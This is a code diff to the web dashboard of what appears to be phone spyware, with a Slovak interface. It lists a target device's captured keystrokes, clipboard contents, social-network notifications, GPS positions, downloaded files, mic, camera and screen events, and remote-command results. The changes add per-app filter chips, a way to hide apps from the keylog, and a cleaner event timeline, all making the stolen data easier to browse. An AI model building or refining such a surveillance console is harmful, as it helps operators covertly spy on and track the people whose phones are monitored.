@@ -231,6 +231,18 @@ td.mono,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;f
   padding:8px 10px;font-size:12.5px;outline:none;max-width:230px;
 }
 #appFilter:focus{border-color:var(--acc)}
+.appchips{display:flex;gap:7px;flex-wrap:wrap;padding:0 16px 12px}
+.chip{
+  display:inline-flex;align-items:center;gap:7px;background:var(--panel3);border:1px solid var(--line2);
+  color:var(--mut);border-radius:20px;padding:5px 11px;font-size:12px;font-weight:600;cursor:pointer;transition:.15s;
+}
+.chip:hover{color:var(--txt);border-color:var(--acc)}
+.chip.on{background:rgba(79,124,255,.2);color:#cfe0ff;border-color:rgba(79,124,255,.5)}
+.chip b{font-size:11px;font-weight:700;color:var(--dim)}
+.chip.on b{color:#cfe0ff}
+.chip.off{opacity:.42;text-decoration:line-through}
+.chip .x{font-style:normal;opacity:.55;font-size:13px;line-height:1;padding:0 1px}
+.chip .x:hover{opacity:1;color:#fca5a5}
 .evtype{font-size:10px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;
   padding:2px 7px;border-radius:12px;background:rgba(255,255,255,.07);color:var(--mut);white-space:nowrap}
 .evtype.TEXT{background:rgba(79,124,255,.16);color:#9dbaff}
@@ -484,6 +496,7 @@ td.mono,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;f
             <button data-t="CLICK">Kliknutia</button>
             <button data-t="NOTIF">Notifikácie</button>
           </div>
+          <div class="appchips" id="keyApps"></div>
           <div class="scroll"><table>
             <thead><tr><th style="width:150px">Čas</th><th style="width:200px">Aplikácia</th><th style="width:90px">Typ</th><th>Obsah</th></tr></thead>
             <tbody id="keyRows"></tbody></table></div>
@@ -626,7 +639,9 @@ td.mono,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;f
 <script src="/static/leaflet/leaflet.js"></script>
 <script>
 const S = {device:null, view:'overview', devices:[], map:null, mini:null, track:null, q:'',
-  app:localStorage.getItem('sp_app')||'', keyType:'', pkgs:new Map(), social:new Map()};
+  app:localStorage.getItem('sp_app')||'', keyType:'',
+  exclude:JSON.parse(localStorage.getItem('sp_exclude')||'[]'),
+  pkgs:new Map(), social:new Map()};
 const $ = id => document.getElementById(id);
 const esc = s => (s==null?'':String(s)).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
 const fmtT = ts => ts ? new Date(ts).toLocaleString('sv-SE',{day:'2-digit',month:'2-digit',hour:'2-digit',minute:'2-digit',second:'2-digit'}) : '—';
@@ -729,6 +744,30 @@ function notePkg(pkg,label,count,ts){
   S.pkgs.set(pkg,e);
   if(e.social) S.social.set(pkg,e);
 }
+function toggleExclude(pkg){
+  const i=S.exclude.indexOf(pkg);
+  if(i>=0) S.exclude.splice(i,1); else S.exclude.push(pkg);
+  localStorage.setItem('sp_exclude', JSON.stringify(S.exclude));
+  const f=LOADERS[S.view]; if(f) f();
+}
+function isExcluded(pkg){ return S.exclude.indexOf(pkg)>=0; }
+function renderAppChips(evs){
+  const box=$('keyApps'); if(!box) return;
+  const counts=new Map();
+  for(const e of evs){ if(!e.pkg) continue; counts.set(e.pkg,(counts.get(e.pkg)||0)+1); }
+  const list=[...counts.entries()].sort((a,b)=>b[1]-a[1]).slice(0,14);
+  const total=evs.length;
+  let html=`<button class="chip ${S.app?'':'on'}" onclick="setAppFilter('')">Všetky aplikácie <b>${total}</b></button>`;
+  for(const [pkg,n] of list){
+    const off=isExcluded(pkg);
+    html+=`<button class="chip ${S.app===pkg?'on':''} ${off?'off':''}" onclick="setAppFilter('${esc(pkg)}')">
+      ${isSocial(pkg)?'<span class="soclabel">sociálna</span>':''}
+      <span>${esc(appLabel(pkg))}</span><b>${n}</b>
+      <i class="x" title="skryť" onclick="event.stopPropagation();toggleExclude('${esc(pkg)}')">×</i></button>`;
+  }
+  if(S.exclude.length) html+=`<button class="chip" onclick="S.exclude=[];localStorage.setItem('sp_exclude','[]');loadKeylog()">zrušiť skrytie (${S.exclude.length})</button>`;
+  box.innerHTML=html;
+}
 function setAppFilter(pkg){
   S.app = (S.app===pkg) ? '' : pkg;
   localStorage.setItem('sp_app', S.app||'');
@@ -810,9 +849,11 @@ async function loadOverview(){
 
   const logs = await j('/api/logs?device_id='+encodeURIComponent(S.device)+'&limit=200')||[];
   const socialSeen=new Set();
+  let socialNotifs=0;
   for(const l of logs){
     if(l.kind==='keylog'){ for(const e of parseKeylog(l.payload)) if(isSocial(e.pkg)) socialSeen.add(e.pkg); }
-    else { const o=parsePayload(l.payload); if(o&&o.pkg&&isSocial(o.pkg)) socialSeen.add(o.pkg); }
+    else { const o=parsePayload(l.payload);
+      if(o&&o.pkg&&isSocial(o.pkg)){ socialSeen.add(o.pkg); if(l.kind==='notification') socialNotifs++; } }
   }
 
   const events = Object.entries(c).sort((a,b)=>b[1]-a[1]);
@@ -825,7 +866,7 @@ async function loadOverview(){
     <div class="card tile" data-go="keylog"><div class="k">${icon('keylog')} Keylog / clipboard</div>
       <div class="v">${keylog}</div><div class="s">zachytených záznamov</div></div>
     <div class="card tile" data-go="apps"><div class="k">${icon('default')} Sociálne siete</div>
-      <div class="v">${(c.notification||0)}</div><div class="s">notifikácií · ${socialSeen.size} sietí</div></div>
+      <div class="v">${socialSeen.size}</div><div class="s">sietí · ${socialNotifs} notifikácií</div></div>
     <div class="card tile" data-go="media"><div class="k">${icon('media')} Súbory</div>
       <div class="v">${d.files||0}</div><div class="s">stiahnutých súborov</div></div>
     <div class="card tile" data-go="commands"><div class="k">${icon('default')} Udalosti</div>
@@ -837,17 +878,30 @@ async function loadOverview(){
       </div>`;
   $('tiles').querySelectorAll('.tile').forEach(t=>t.addEventListener('click',()=>go(t.dataset.go)));
 
-  $('tlHint').textContent = logs.length+' záznamov';
-  $('timeline').innerHTML = logs.length ? logs.map((l,i)=>{
-    const o=parsePayload(l.payload);
-    const extra = pickText(o,['text','msg','body','title','app','package','reason','err'])
-                  || (o&&o.lat!==undefined? (o.lat+', '+o.lon) : l.payload);
-    return `<li style="cursor:pointer" onclick="openModal('${esc(l.kind)} · ${fmtT(l.ts)}', ${JSON.stringify(l.payload).replace(/'/g,"\'")})">
+  /* The raw log is a mess - the keylog of a coding session fills the whole
+     panel. Only the events that mean something are listed here, the raw
+     payload stays in the detail window. */
+  const TL_KEEP=/^(boot|cmd_result|location|location_status|crash|file|mic|camera|screen|install|ddr|cmd)/;
+  const tl=logs.filter(l=>TL_KEEP.test(l.kind));
+  $('tlHint').textContent = tl.length+' udalostí';
+  const tlText=(l)=>{
+    const o=parsePayload(l.payload)||{};
+    switch(l.kind){
+      case 'location': return `Poloha ${num(o.lat,4)}, ${num(o.lon,4)}${o.acc!=null?' · ±'+Math.round(o.acc)+' m':''}`;
+      case 'location_status': return o.reason==='no_permission' ? 'Chýba povolenie na polohu' : 'Bez fixu polohy';
+      case 'cmd_result': return `Príkaz ${o.cmd||''} ${o.ok===false?'zlyhal':'prebehol'}${o.reason?(' · '+o.reason):''}`;
+      case 'crash': return 'Aplikácia spadla';
+      case 'boot': return 'Aplikácia sa spustila';
+      default: return pickText(o,['reason','err','error','cmd','name']) || String(l.payload).slice(0,80);
+    }
+  };
+  $('timeline').innerHTML = tl.length ? tl.slice(0,14).map(l=>`
+    <li style="cursor:pointer" onclick="openModal('${esc(l.kind)} · ${fmtT(l.ts)}', ${JSON.stringify(l.payload).replace(/'/g,"\'")})">
       <span class="ic">${icon(l.kind.replace('beacon:',''))}</span>
       <span class="tx"><b>${kindTag(l.kind)}</b>
-        <span class="val">${esc(String(extra).slice(0,160))}</span></span>
-      <span class="tm">${fmtT(l.ts).split(' ').slice(-1)}</span></li>`;
-  }).join('') : '<div class="empty">Zatiaľ žiadne udalosti.</div>';
+        <span class="val">${esc(String(tlText(l)).slice(0,120))}</span></span>
+      <span class="tm">${fmtT(l.ts).split(' ').slice(-1)}</span></li>`).join('')
+    : '<div class="empty">Zatiaľ žiadne udalosti.</div>';
 
   $('profile').innerHTML = `
     <dt>ID</dt><dd class="mono">${esc(dev.device_id||'')}</dd>
@@ -858,7 +912,8 @@ async function loadOverview(){
     <dt>Prvý kontakt</dt><dd>${fmtT(dev.first_seen)}</dd>
     <dt>Posledný kontakt</dt><dd>${fmtT(dev.last_seen)}</dd>
     <dt>Súbory</dt><dd>${d.files||0}</dd>
-    <dt>Typy dát</dt><dd>${events.map(([k,n])=>`<span class="tag">${esc(k)} ${n}</span>`).join(' ')||'—'}</dd>`;
+    <dt>Typy dát</dt><dd>${events.slice(0,7).map(([k,n])=>`<span class="tag">${esc(k)} ${n}</span>`).join(' ')||'—'}${
+      events.length>7?` <span style="color:var(--dim)">+${events.length-7}</span>`:''}</dd>`;
 
   drawMini(loc);
 }
@@ -1003,22 +1058,28 @@ async function loadKeylog(){
     }
   }
   const q2 = S.keyType;
+  renderAppChips(evs);
   const view = evs.filter(e=>{
     if(S.app && e.pkg!==S.app) return false;
+    if(isExcluded(e.pkg)) return false;
     if(q2 && e.type!==q2) return false;
     if(q && !String(e.text).toLowerCase().includes(q)) return false;
     return true;
   }).sort((a,b)=>String(b.raw).localeCompare(String(a.raw)));
   for(const e of view) notePkg(e.pkg, null, 1, e.raw);
   refreshAppFilter();
-  const sub = S.keyType? ' · '+S.keyType : '';
-  $('keyHint').textContent = view.length+' záznamov'+sub+(S.app? ' · '+appLabel(S.app):'');
+  const parts=[view.length+' záznamov'];
+  if(S.keyType) parts.push(S.keyType);
+  if(S.app) parts.push(appLabel(S.app));
+  if(S.exclude.length) parts.push(S.exclude.length+' aplikácií skrytých');
+  $('keyHint').textContent = parts.join(' · ');
   $('keyRows').innerHTML = view.length ? view.map(e=>`<tr>
       <td class="mono">${esc(eventTime(e,e.raw))}</td>
       <td>${e.pkg?`<span class="soclabel" style="${isSocial(e.pkg)?'':'display:none'}">sociálna</span> `:''}${esc(appLabel(e.pkg))}
           <div style="font-size:10px;color:var(--dim);font-family:ui-monospace,Menlo,monospace">${esc(e.pkg||'')}</div></td>
       <td><span class="evtype ${esc(e.type)}">${esc(e.type)}</span></td>
-      <td>${esc(String(e.text).slice(0,600))}</td></tr>`).join('')
+      <td title="${esc(String(e.text).slice(0,4000))}">${esc(String(e.text).slice(0,300))}${
+        String(e.text).length>300?' <span style="color:var(--dim)">…</span>':''}</td></tr>`).join('')
     : '<tr><td colspan="4" class="empty">Zatiaľ žiadne záznamy. Skús iný filter alebo príkaz „clipboard“.</td></tr>';
 }
 async function loadClipboard(){
